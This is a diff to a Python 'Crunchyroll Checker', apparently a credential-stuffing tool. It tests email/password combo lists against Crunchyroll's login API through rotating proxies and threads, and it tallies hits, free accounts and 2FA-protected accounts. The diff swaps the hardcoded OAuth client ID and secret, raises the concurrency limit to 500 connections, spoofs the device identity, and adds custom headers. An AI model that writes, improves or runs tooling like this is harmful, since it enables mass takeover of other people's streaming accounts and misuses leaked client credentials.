@@ -44,8 +44,8 @@ ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
 SUBS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v3/subscriptions/{}"
 BENEFITS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"
 
-CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
-CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
+CLIENT_ID = "y2arvjb0h0rgvtizlovy"
+CLIENT_SECRET = "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2"
 USER_AGENT = "Crunchyroll/deviceType: MeowMal; appVersion: 4.10.0; osVersion: 12; model: MeowMal; manufacturer: Amazon; brand: Amazo"
 
 proxies_list = []
@@ -64,11 +64,8 @@ lock = threading.Lock()
 proxy_lock = threading.Lock()
 
 def clear_screen():
-    if os.name == 'nt':
-        os.system('cls')
-    else:
-        sys.stdout.write('\033[H\033[2J')
-        sys.stdout.flush()
+    sys.stdout.write('\033[H\033[2J')
+    sys.stdout.flush()
 
 def display_cui():
     clear_screen()
@@ -100,6 +97,7 @@ def get_proxy():
     
     with proxy_lock:
         proxy_str = next(proxy_cycle)
+    
     if "://" in proxy_str:
         return {
             "http": proxy_str,
@@ -132,7 +130,7 @@ def update_title():
             cpm = 0
         
         title = f"Crunchyroll Checker | CPM: {cpm} | Hits: {hits} | Checked: {checked}/{total_accounts}"
-        sys.stdout.write(f"\x1b]2;{title}\x07")
+        sys.stdout.write(f"\033]0;{title}\007")
         sys.stdout.flush()
         
         if UI_MODE == "1":
@@ -151,7 +149,7 @@ def check_account(email, password):
     global checked, hits, bads, free, retries, errors, two_fa
     
     session = requests.Session()
-    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)
+    adapter = HTTPAdapter(pool_connections=500, pool_maxsize=500)
     session.mount("https://", adapter)
     session.mount("http://", adapter)
     
@@ -164,11 +162,15 @@ def check_account(email, password):
         
         headers = {
             "Host": "beta-api.crunchyroll.com",
+            "Accept": "application/json",
+            "Accept-Charset": "UTF-8",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": USER_AGENT,
             "etp-anonymous-id": session_id,
             "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
+            "Accept-Encoding": "gzip",
+            "x-MeowMal": "@MeowMal",
+            "x-Meow": "@MeowMal"
         }
         
         try:
@@ -179,7 +181,7 @@ def check_account(email, password):
                 "scope": "offline_access",
                 "client_id": CLIENT_ID,
                 "client_secret": CLIENT_SECRET,
-                "device_type": "MeowMal",
+                "device_type": "Oppo",
                 "device_id": device_id,
                 "device_name": "MeowMal"
             }
@@ -220,8 +222,14 @@ def check_account(email, password):
             if not access_token or not account_id:
                 continue
 
-            auth_headers = headers.copy()
-            auth_headers["Authorization"] = f"Bearer {access_token}"
+            auth_headers = {
+                "Host": "beta-api.crunchyroll.com",
+                "authorization": f"Bearer {access_token}",
+                "etp-anonymous-id": session_id,
+                "accept-encoding": "gzip",
+                "if-modified-since": "Sun, 14 Apr 2024 17:28:31 GMT",
+                "User-Agent": USER_AGENT
+            }
             
             country = "N/A"
             external_id = None
@@ -340,7 +348,7 @@ def check_account(email, password):
                 with lock:
                     free += 1
                     if UI_MODE == "2":
-                        print(f"{YELLOW}[-] FREE: {email}{RESET}")
+                        print(f"{YELLOW}[[-] FREE: {email}{RESET}")
             
             with lock:
                 checked += 1
